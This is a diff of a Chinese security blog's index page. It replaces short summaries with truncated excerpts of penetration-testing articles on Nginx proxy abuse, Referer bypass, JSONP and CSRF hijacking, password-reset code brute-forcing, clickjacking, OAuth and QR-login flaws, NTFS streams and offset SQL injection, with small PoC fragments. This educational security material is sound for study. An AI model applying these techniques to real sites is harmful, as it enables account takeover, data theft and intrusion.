+在BurpSuite里进行重放测试发现返回的响应正文就是 http://gh0st.cn 的，也就是说这里的attack_website可以被作为HTTP代理，于是进入下一步的测试能否使用非http/https协议进行请求？例如file:///，测试后发现确实没办法这样玩，看来是这里代理服务器不支持。
+在这里替换URI部分为内网的地址，可以直接漫游内网的系统，进行深入的渗透测试了，后续的事情就不在这多说了，那么来研究看看为什么会有这样的问题呢？
+从被动偶然到主动发现
+了解原理
+查阅了一番资料和询问了一下朋友，都说具体的不太清楚，后来看见这样一篇文章：
+https://www.secpulse.com/archives/74676.html
+其中所说原理大致是因为Nginx反向代理配置不当导致可以被作为正向代理，导致能被外部作为HTTP代理服务器。
+正向代理 and 反向代理
+正向代理
+浏览器（/全局）设置代理服务器IP和对应端口
+浏览器输入目标地址-&gt;代理服务器-&gt;目标服务器
+简而言之，正向代理类似我们经常用到的跳板机，利用代理去访问外部的资源。
+
+反向代理
+跟正代不同的地方在于反向代理相对浏览器来说是透明的，不需要在浏览器（/全局）做什么配置，而是有反向代理服务器…</p>
                       </details>
                       <hr>
                     </article>
@@ -1668,7 +2551,51 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>387</time></span>
                         </b>
                       </div>
-                      <p>组合拳出击-Self型XSS变废为宝</p>
+                      <p>前言
+作者：Vulkey_Chen
+博客：gh0st.cn
+这是一个鸡肋性质的研究，也许有些标题党，请见谅～
+本文启发于一些讨论，和自己脑子里冒出来的想法。
+组合拳搭配
+Self型XSS
+已知Self型XSS漏洞是这样的：
+
+相信看见图片基本上已经知道这个漏洞形成的原因了，该功能点有一个编辑预览的，输入XSS的payload就触发。
+局限点在于这个漏洞是Self型(Myself)，也就是只能自己输入-&gt;自己触发漏洞。
+变换思考
+重新理一下这个漏洞触发的流程：
+1.输入XSS payload:
+
+
+
+
+2.触发
+那么是否也可以理解为这样的一个触发流程：
+1.XSS payload就在剪贴板中
+2.黏贴到文本框
+3.触发
+也就是说在这里我只需要沿着这个流程向下拓展，是否可以让我变换的触发流程文字变成代码形式。
+顺推流程
+触发流程顺推为攻击流程：
+1.诱导受害者点开连接
+2.诱导受害者点击复制按钮
+3.诱导受害者黏贴剪贴板的内容
+4.顺利触发XSS漏洞
+这一切的攻击流程看起来可操作性并不强，但实际上还是会有很多人中招。
+搭配谁？
+以上的攻击流程都需要在同一个页面中触发，那么就需要一个点击劫持的配合。
+“上天总是眷顾长得帅的人”，在这里确实也存在着点击劫持的问题：
+
+代码思考&amp;构建
+复制功能
+按流程来构建，首先构建复制到剪贴板的功能：
+JavaScript有这样的功能，代码如下，自行 ”食“ 用：
+
+
+function cpy(){
+	var content&#x3D;document.getElementById(&quot;test&quot;);//获取id为test的对象
+	content.select();//全选内容
+	document.execCommand(&quot;Copy&quot;);//执行复制命令到剪…</p>
                       </details>
                       <hr>
                     </article>
@@ -1688,7 +2615,57 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>238</time></span>
                         </b>
                       </div>
-                      <p>GET请求Referer限制绕过总结</p>
+                      <p>前言
+在做测试的时候会遇见这样几个漏洞场景：
+JSONP跨域劫持
+反射XSS
+GET请求类型攻击
+但是，在相对安全的情况下，都会有Referer(HTTP请求头)的限制。那么该如何去做绕过呢？
+正文
+什么是Referer？
+Referer是请求头的一部分，假设A站上有B站的链接，在A站上点击B站的链接，请求头会带有Referer，而Referer的值为A站的链接；这也就是为什么上文所说的场景，遇见了Referer的限制就可能GG了。
+
+绕过之道
+常规绕过
+一个实际场景：
+
+先来说说一些常规化的东西：
+子域名方式
+使用子域名的方式进行绕过：
+
+域名前增加
+在域名前面增加随机的a-z和0-9也可以进绕过：
+
+？号
+将域名作为GET请求参数进行绕过：
+
+打破常规
+无Referer
+之前在做测试的时候，将Referer头删除也可以绕过，但是在真正的利用中能不能去实现呢？是可以的。
+在HTML标签中有这样一个标签，而这个标签是表示无Referer，就是如下的代码：
+
+
+
+
+我原来的PoC为：
+
+
+  
+  history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)
+    
+      
+    
+    
+      document.forms[0].submit();
+    
+  
+
+
+
+修改之后的PoC为：
+
+
+  &lt;meta name&#x3D;&quot;referrer&quot; conten…</p>
                       </details>
                       <hr>
                     </article>
@@ -1708,7 +2685,47 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>272</time></span>
                         </b>
                       </div>
-                      <p>议题解读《我的Web应用安全模糊测试之路》</p>
+                      <p>前言
+坏蛋(春秋社区)跟我说要我准备议题的时候，我是懵逼的～仔细想了一下自己这么菜，能讲什么呢？
+思考了很久最终定了这个标题：《我的Web应用安全模糊测试之路》
+这篇议题主要围绕我做Web应用安全测试的时候所运用的一些技巧和思路。
+
+我的Web应用安全模糊测试之路
+什么是Web应用中的模糊测试？
+Web应用是基于什么进行传输的？HTTP协议。
+模糊测试是什么？Payload随机。
+Payload放哪里？HTTP请求报文格式是什么？请求行(请求方式 URI HTTP/1.1)、请求头、请求报文主体(POST Data)。
+模糊测试秘籍-&gt;增(Add) &amp;&amp; 删(Del)
+被固化的测试思维
+我列出一个请求，边看边思考你会怎么测试这个请求呢？
+HTTP请求报文(Request)：
+
+GET /uc/getInfo HTTP/1.1
+Host: gh0st.cn
+Origin: http://gh0st.cn
+...
+
+
+HTTP响应主体(Response Content):
+
+{
+    &quot;id&quot;: &quot;1024&quot;,
+    &quot;realName&quot;: &quot;yudan&quot;,
+    &quot;mobilePhone&quot;: &quot;13888888888&quot;,
+    &quot;cardNo&quot;: &quot;111111111111111111&quot;
+}
+
+
+看到这想必你已经知道自己要测试的内容是什么了，一般来讲很多人会先注意Origin这个HTTP请求报文头，看响应的HTTP头：
+
+...
+Access-Control-Allow-Origin: http://gh0st.cn
+Access-Control-Allow-Crdentials: True
+Access-Control-Allow-Methods: OPTION, POST, GET
+...
+
+
+如果我修改Origin的值为http://qianan.cn，返回的也…</p>
                       </details>
                       <hr>
                     </article>
@@ -1728,7 +2745,38 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>236</time></span>
                         </b>
                       </div>
-                      <p>本文总结一下漫长的渗透测试过程，想尽了各种方法，终于找到了突破口。so没有绝对的安全，所谓的安全性其实都是相对的～</p>
+                      <p>前言
+本文总结一下漫长的渗透测试过程，想尽了各种方法，终于找到了突破口。so没有绝对的安全，所谓的安全性其实都是相对的～
+信息踩点
+在这里其实没办法去做一些有价值的收集，只能踩点，踩坑。
+信息难点：
+传输加密：
+要做渗透的目标是一个APP，根据抓到的请求包发现这个APP是经过某产品加固过的，所以HTTP的POST请求正文部分(Data)是神奇的密文～
+分析难点
+分析：
+信息踩点其实也是解决难点的过程，在这里我们尝试对APP进行逆向，发现并没有什么东西，因为被加固了。
+对APP进行功能的整理，逐个功能点进行抓包分析：
+    
+请求正文(data)虽然是密文，但是请求的URI还是真正按照对应的功能去请求的（参考URI的命名和功能的相对应性）
+建立设想(A)：
+在这里请教了师傅，说可能GET请求参数并没有经过加密，而后台很有可能是这样写的：
+
+
+
+
+一点即通，首先我可以去测试是否是真的这样的后端处理接收。
+为了满足第一步的验证，我需要想办法找到一个GET请求的包并且有带有GET参数，这样我才能判断规则，不然就是大海捞针。
+有价值的东西
+其实对APP做渗透测试，大部分情况下还是对网站做渗透测试。
+所以在这里抓包获取到的HOST，直接对其进行了前期的常规信息刺探（端口、目录、指纹…）
+中间件：Tomcat
+
+目录开放：/fileUpload/
+端口开放：8001 1444
+APP三个功能点：个人用户、资金管理、生活栏目
+渗透开端
+一开始粗略的对整个APP进行抓包，然后做一些简单的测试，发现并没有那种明面上的漏洞（SQL注入、XSS等等…），但是获取了这几条URI：
+/userCenter/ge…</p>
                       </details>
                       <hr>
                     </article>
@@ -1768,7 +2816,54 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>133</time></span>
                         </b>
                       </div>
-                      <p>密码重置思路-小密圈的一道题</p>
+                      <p>前言
+考验技能：黑盒逻辑思考思维
+提示：http://gh0st.cn/archives/2018-04-18/1 （文中出现过这个思路）
+题目链接：已经下线（密码重置）
+一般来说，很多人应该先走一遍流程：
+走流程
+验证码发送
+
+返回包：
+
+验证码验证
+
+错误返回：
+
+流程分析
+察言观色
+
+如上是发送验证码请求对应的响应报文，从报文可以获取到如下的信息：
+后端验证验证码的方式是基于SESSION会话ID的
+验证码的形势是4位数纯数字
+缺陷发现
+四位数纯数字，爆破一下？可是问题来了~
+错误三次之后就提示失效了验证码：
+
+怎么办？这是一道考思维的题目，国内太多的逻辑漏洞的文章了，可是大多数人学习的是1:1的学习，不会变通。逻辑漏洞不仅仅存在于固有的业务逻辑上，还有代码逻辑~打开你的黑盒测试思维，任何点你都只能猜测，所以为什么不多猜猜？
+文章中写过会有万能密码的存在：
+
+测试下在这里并不存在，没有这样的缺陷，这时候你就需要考虑更多的东西，不要做个“表面性”测试的“白帽子”~
+之前说了错误三次验证码会失效，但是否是真的失效了？假设没有失效只是“表面性”的输出失效呢？
+思考后台代码逻辑，参考我提示中链接的文章：
+
+在这里代入到密码重置这一环节是否有用呢？来测试下：
+
+这里多了一线生机，因为提示了密码错误，而不是失效，那么是否能借助这个来绕过次数限制呢？
+在这里你可以选择使用Python来帮助你，但我认为这完全没必要，因为BurpSuite解决了一切：
+数据包发送到intruder模块，设置attack type为Pitchfork，设置好payload位置：
+
+Pitchfork的工作模式是多组的，如上我设置了两个payload位置，使用这个模式需要两个payload的数量是一样的，发送的请求为A[1]对B[1]。
+设置payload：
+第一个为字符块（Character blocks）-这种类型的Payload是指使用一个给出的输入字符串，根据指定的设置产生指定大小的字符块，表现形式为生成指定长度的字符串。
+第二个为数字（Numbers）-这种类型的Payload是指根据配置，生成一系列的数字作为Payload。
+
+测试发现真实可用：
+
+总结
+黑盒测试的精华是什么？Fuzzing.
+你现在掌握的思路归根到底都是Fuzzing的结晶。
+在漏洞挖掘中打开你的思维，加油~</p>
                       </details>
                       <hr>
                     </article>
@@ -1788,7 +2883,29 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>368</time></span>
                         </b>
                       </div>
-                      <p>CSRF之你登陆我的账号#业务逻辑组合拳劫持你的权限</p>
+                      <p>前言
+这是一个理论上通杀很多大型企业网站的漏洞缺陷~
+可能很多朋友点击来看见标题就觉得，这家伙在吹牛逼了我倒要看看这货能怎么吹,CSRF之登陆我的账号能有啥玩意危害？ 
+先按奈住你心中不屑的情绪，听我慢慢道来~
+通用业务功能分析
+最近很喜欢挖一些通用漏洞（不是程序通用，而是功能通用），会经常拿着BAT三家以及其他一些大型网站进行业务功能点的对比，来看看有哪些是共用的功能点，这边列出以下的几条：
+QQ快捷登陆
+微信快捷登陆
+微博快捷登陆
+其他……
+
+OAuth2.0认证缺陷-快捷登陆账号劫持的问题具体可以参考：http://gh0st.cn/archives/2018-02-12/1 （来自i春秋社区）
+这种问题其实需要一定的运气因为很多的快捷登陆有state参数的干扰，所以是完全没办法去利用的。
+在这里我尝试能不能挖到一个新的缺陷，在走正常的快捷登陆流程时我发现需要绑定这个网站的账号才可以正常的使用用户的功能，这时候反着想网站的用户中心是否有第三方的账号绑定？
+这里找了大部分的网站都有这样的功能（第三方账号绑定，绑定了即可使用第三方账号直接登陆），找到了这个功能点就可以来测试，先走一遍正常的绑定流程：
+点击绑定第三方账号
+进入第三方账号绑定页面
+（如果第三方账号是登陆状态）-&gt;需要点击授权按钮；(如果第三方账号是未登陆状态)-&gt;需要输入第三方的账号密码登陆-&gt;点击授权按钮
+
+设立猜想
+梳理了流程之后，一个很骚的思路就从脑子里蹦了出来：
+有第三方账号绑定这个功能，登陆处也有第三方账号登陆功能，也就是说绑定第三方账号代表着权限分享给了第三方账号。
+猜想建立-&gt;如果我有第三方账号所在网站的CSRF之你登陆我的账号缺陷，让受害者先登陆我的第三方账号（为了避免损失，我可以注册一个小号），然后绑定处也有CSRF绑定的缺陷或者点击劫持问题，那么我就可以让受害者绑定我的第三方账号，然后根据…</p>
                       </details>
                       <hr>
                     </article>
@@ -1808,7 +2925,35 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>244</time></span>
                         </b>
                       </div>
-                      <p>Web安全测试学习手册-业务逻辑测试</p>
+                      <p>首先感谢朋友倾璇的邀请 http://payloads.online/archivers/2018-03-21/1 ，参与了的相关撰写，目前负责业务逻辑测试这一块的撰写，目前初步已经成型，先发出来让大家看看，欢迎点评，也可以加入我们一起来撰写~
+业务逻辑测试
+介绍：这里对Web应用业务逻辑方面的安全缺陷进行介绍和常见案例讲解。
+
+任意用户密码重置
+常见的缺陷
+* 1.验证码类缺陷
+-场景：
+1.1 验证码回显在客户端(响应主体、Set-Cookie等等…)。
+1.2 验证码过于简易时效性过长，接口未做限制(一般为纯数字4-8位数，时效性长达30分钟以上可以对验证码进行枚举)。
+* 2.未校验权限/前端校验/越权
+-场景：
+2.1 任意手机号验证码都可重置任意账号。
+2.2 修改响应包的主体(根据实际情况来修改 例如验证请求对应的响应报文的主体为false 你可以修改为true)。
+2.3 同一浏览器进入A用户的重置，然后关闭再进入B用户的重置 而实际上重置A用户。
+2.4 修改重置密码的相关参数(例如 userid等等…)。
+* 3.HOST头伪造
+-场景：
+3.1 在邮箱找回密码的时候，可以简单替换Host部分进行Fuzz，看看找回密码的链接中的域名是否是根据Host来生成的如果是可以替换成自己的域名。但是这种思路很鸡肋，因为需要用户的点击，这样才可以根据日志看到重置密码的链接，万一重置密码的链接时效性过去就无奈了。
+* 4.找回密码的凭证脆弱
+-场景：
+4.1 见过最多的是找回密码的token是base64编码的，而解码后的明文根据其规则修改就可以成为别人用户找回密码的凭证了。
+验证码绕过
+常见的缺陷
+图形类验证码绕过
+* 1.图形验证码可复用
+-场景：
+3.1 验证码刷新之后，而历史刷新的验证码还是可以继续使用。
+3.2 验证码使用过后不刷新，时效性不过期，可以一直复…</p>
                       </details>
                       <hr>
                     </article>
@@ -1828,7 +2973,27 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>244</time></span>
                         </b>
                       </div>
-                      <p>二维码登陆，在表面上来看好像是很安全，但是深入去研究会发现很多都是存在安全隐患～</p>
+                      <p>二维码登陆的常见缺陷剖析
+现在很多的电商平台和互联网型企业都有自己的手机APP，为了方便用户的体验，于是就有了”扫码登陆”这样的功能。看似扫码登陆，实际上还是基于HTTP请求来完成的。
+了解扫码登陆步骤
+标准的二维码登陆流程如下：
+打开web界面进入登陆然后加载二维码
+网站开始轮询，来检测二维码状态
+打开手机APP进入”扫一扫”，扫描二维码
+网站检测到二维码被扫描，进入被扫描后的界面，继续轮询来获取凭证
+手机APP进入确认登陆界面
+(当点击确认登陆)网站轮询结束获取到了凭证，进入个人中心；(当取消登陆)网站轮询设定时间自动刷新页面。
+常见缺陷剖析
+0x00 非标准扫码登陆流程缺陷
+非标准流程描述
+扫描登陆的流程如果不按照标准来做也会存在很多问题，国内一些企业在处理这些的时候省略了如上所述的第五步骤和第六步骤，而是直接扫描后立即登陆。
+分析非标准流程可能存在的问题
+可进行1:1比例诱导扫描
+二维码是一张图片而图片是可以移植的，所以我们可以1:1克隆一个登陆页面来诱导用户进行扫描，这样就可以直接获取用户的权限了。
+因为保密协议的问题，这里不对漏洞详情进行描述，简单的使用文字进行叙述：
+在测试这种问题的时候，只需要按照步骤去测试下即可发现是否有相对于的问题，我一般会使用浏览器ctrl+s快捷键先克隆下来，因为这样会自带css和js等文件，剩下的只需要你处理一下就行了，也可以参考我之前的文章：微信Netting-QRLJacking分析利用-扫我二维码获取你的账号权限，方法类似就行，但是这里的微信二维码登录是基于OAuth2.0协议的，所以当用户点击之后，我只要获取到授权凭证链接就行了，而一般的二维码登陆是不基于OAuth2.0协议的，就需要处理好你的交互问题。
+0x01 QRLJacking-二维码登陆劫持
+2017年OWASP推出了这种攻击方式：https://www.owas…</p>
                       </details>
                       <hr>
                     </article>
@@ -1848,7 +3013,33 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>199</time></span>
                         </b>
                       </div>
-                      <p>大部分人所认识的CSRF都是写入型的，而本文是对读取型CSRF的一个总结...</p>
+                      <p>前言
+最近在挖洞，”实践出真知”这句话说的很对，在实际挖掘过程中我会思考很多东西，跟朋友一起准备做一份手册，忽然的想到了一些漏洞的定义和规范。
+在大多数的人眼里CSRF可能仅仅是写入型的比如：修改个人资料、授权登陆等等功能场景的CSRF问题，同时对CSRF这类问题进行了危害等级划分，就像如上两个例子，可以划分为中危和高危。也许是因为交互式的漏洞并没有SQLi这种直接能利用的漏洞危害高，所以一些厂商对CSRF也并不重视。
+步入正题，什么是读取型CSRF，这里我对如下的漏洞归纳进了读取型CSRF，因为这些漏洞的利用手法都跟CSRF是一样的：
+JSONP劫持
+Flash跨域劫持
+CORS跨域资源读取
+…等等，当然还有Silverlight跨域这些了，不过这里只列举常见的三种来讲解。
+读取型CSRF
+接下以如上所说的三个漏洞案例来一个个分析。
+JSONP劫持
+漏洞案例
+这里来看一条请求：
+
+这条请求返回的结果中有手机号（这里我测试的账号没绑定手机），如果我们想要以CSRF交互式攻击的方式获取这个手机号该怎么办？
+来看看这条请求有callback，而返回结果是不是类似Javascript中的函数？
+Javascript原函数定义如下：
+
+function funName(){}
+
+
+这里是缺少了函数定义的关键词function和花括号的函数主体部分，只有函数名和函数传参，聪明人已经想到了，这不就相当于是自定义函数被引用了么，而中间那段传参就相当于是一个数组，所以我们可以先用JS自定义好这个函数，然后再引用这个请求，自然就可以获取到数据了。
+这时候我们可以来构建一下PoC：
+
+
+function jsonp2(data){alert(JSON.stringify(data));}
+&lt;script src&#x3D;&quot;htt…</p>
                       </details>
                       <hr>
                     </article>
@@ -1888,7 +3079,30 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>343</time></span>
                         </b>
                       </div>
-                      <p>OAuth2.0认证缺陷，巧妙的使用白名单让攻击链产生...</p>
+                      <p>什么是OAuth2.0？
+OAuth2.0是OAuth协议的下一版本，但不向后兼容OAuth 1.0即完全废止了OAuth1.0。 OAuth 2.0关注客户端开发者的简易性。要么通过组织在资源拥有者和HTTP服务商之间的被批准的交互动作代表用户，要么允许第三方应用代表用户获得访问的权限。同时为Web应用，桌面应用和手机，和起居室设备提供专门的认证流程。2012年10月，OAuth 2.0协议正式发布为RFC 6749 。
+RFC 6749 : https://tools.ietf.org/html/rfc6749
+QQ OAuth2.0 流程分析&amp;攻击
+国内的很多厂商使用了OAuth2.0的认证方式，这里以QQ为例。
+QQ互联 : https://connect.qq.com/intro/login
+相信大家在很多网站上都见过如下的登陆界面：
+
+可以看见除了厂商本身网站的账号以外还有QQ跟微信这两个快捷登陆，首先以QQ的快捷登陆为例子：
+点击QQ图标进入登陆的链接 -&gt; https://graph.qq.com/oauth2.0/show?which&#x3D;Login&amp;display&#x3D;pc&amp;response_type&#x3D;code&amp;client_id&#x3D;100273020&amp;redirect_uri&#x3D;http://a.com/?view&#x3D;null&amp;uuid&#x3D;65392bc3fc724fca8dcba23558f67ec8
+
+这里因为我的QQ是在电脑上已经登陆了，所以我可以直接进行登陆，这时候进行抓包截取整个流程，
+关键流程分析
+Request 1：
+
+POST /oauth2.0/authorize HTTP/1.1
+Host: graph.qq.com
+
+
+1 Response：
+
+HTTP/1.1 302 Moved Temporarily
+Server: tws
+Date: Fr…</p>
                       </details>
                       <hr>
                     </article>
@@ -1908,7 +3122,20 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>211</time></span>
                         </b>
                       </div>
-                      <p>笔者挖到了一个selfxss，在思考之后想起了ClickJacking，于是结合之...</p>
+                      <p>前言
+有一段时间没做测试了，偶尔的时候也会去挖挖洞。本文章要写的东西是我利用ClickJacking拿下管理员权限的测试过程。但在说明过程之前，先带大家了解一下ClickJacking的基本原理以及简单的漏洞挖掘。
+ClickJacking
+ClickJacking背景说明:
+ClickJacking（点击劫持）是由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼在2008年首创的。
+ClickJacking是一种视觉欺骗攻击手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情(被欺骗)的情况下，点击攻击者想要欺骗用户点击的位置。
+说道视觉欺骗，相信有炫技经验的朋友们一定会想到，自己一个后台拿不下Webshell权限的时候，而想要黑掉首页从而达到炫技，使用的是什么呢？没错一般使用CSS样式表来劫持首页以造成黑掉的假象~
+
+
+
+hacked by key
+
+
+&lt;for…</p>
                       </details>
                       <hr>
                     </article>
@@ -2008,7 +3235,25 @@ Ethernaut是一个智能合约漏洞靶场
                           <span>字数: <time>281</time></span>
                         </b>
                       </div>
-                      <p>利用文件流可以给渗透测试带来很大的便利</p>
+                      <p>What is NTFS文件流
+NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。
+NTFS文件流生成步骤
+我们在任意一个NTFS分区下打开CMD命令提示符，输入echo mstlab&gt;&gt;mst.txt:test.txt，则在当前目录下会生成一个名为mst.txt的文件，但文件的大小为0字节，打开后也无任何内容。
+
+只有输入命令：notepad mst.txt:test.txt 才能看见写入的mstlab
+
+在上边的命令中，mst.txt可以不存在，也可以是某个已存的文件，文件格式无所谓，无论是.txt还是.jpg|.exe|.asp都行b.txt也可以任意指定文件名以及后缀名。（可以将任意文本信息隐藏于任意文件中，只要不泄露冒号后的虚拟文件名(即test.txt)，别人是根本不会查看到隐藏信息的）
+
+包含隐藏信息的文件仍然可以继续隐藏其它的内容，对比上例，我们仍然可以使用命令echo 
+mstlab1&gt;&gt;mst.txt:test1.txt给mst.txt建立新的隐藏信息的流文件，使用命令notepad 
+mst.txt:test1.txt打开后会发现mstlab1这段信息，而mstlab仍然存在于mst.txt:test.txt中丝毫不受影响
+
+所以这里的宿主mst.txt成功的被test.txt和test1.txt所寄生，而在这里的微妙关系显而易见，宿主消失寄生消失。
+NTFS特性和原理分析
+特性1
+实验工具下载：https://github.com/wangyongxina/filestreams/blob/master/Release/Release.7z
+工具使用说明：
+cr…</p>
                       </details>
                       <hr>
                     </article>
@@ -2025,10 +3270,31 @@ Ethernaut是一个智能合约漏洞靶场
                           <span><a href=https://gh0st.cn>Chen&#x27;s Blog</a></span> |
                           <span>更新日期: <time class="jst-iso-time" datetime="2017-03-07T16:00:00.000Z">2017-03-07T16:00:00.000Z</time></span> |
                           <span>预计阅读时间: <time>1 min</time></span> |
-                          <span>字数: <time>265</time></span>
+                          <span>字数: <time>264</time></span>
                         </b>
                       </div>
-                      <p>本文中我们研究了一种新的注入技术让“偏移注入不在需要人品”。在这里定义这种注入技术为：“移位溢注技术”。</p>
+                      <p>介绍：
+在Access数据库类型注入的时候，我们获取不到列名(前提是有表名)，一般会选择使用偏移注入，但是这种注入方式往往借助的是个人的人品，且步骤繁琐。本文中我们研究了一种新的注入技术让“偏移注入不在需要人品”。在这里定义这种注入技术为：“移位溢注技术”。
+它适用于ACCESS和MYSQL（任何版本）
+正文：
+我们先来看看普通的偏移注入步骤：
+
+1.判断注入点
+2.order by 判断长度
+3.判断表名
+4.联合查询
+5.获取表中列数：**union select 1,2,3,4,..,\* from TABLE**
+6.开始偏移注入：**TABLE as a inner join TABLE as b ona.id&#x3D;b.id**
+
+
+由于步骤6的方法过于需要人品值，且语句繁琐，因此在这里，我们研究新的注入技术：
+首先来看看步骤6语句的整体意思：
+步骤6的语句，表示给TALBE取2个别名，然后分别用别名取查询TALBE的内容（表a和表b）；而on a.id &#x3D; b.id 这样的条件是为了满足语法需求，实际并没有作用，因为相同内容的表，相同字段内容一定相同。
+这时，我们再回过头来看步骤5：
+由于联合查询中select后面添加数字的目的是为了让联合查询返回接结果和网站正常查询返回的结果的列数一致（不一致数据库会报错，页面无法显示），且*表示通配符，可以表示整个表格所有列；因此这里通过数字来占位，并使用*来替代TABLE中的所有列，使得联合查询可以完成，并推算出*的值。
+这时候我们继续研究偏移注入的整体公式方法，发现即使使用多级偏移注入也需要一定的概率(人品值)才可以得到想要的结果，所以我们就尝试研究新的方法能不能替换这种不固定概率的方法。
+现在我们重新整理一下SQL语句，从联合查询开始：
+1.原union语句：union select 1,2,3,..,p..,n from…</p>
                       </details>
                       <hr>
                     </article>
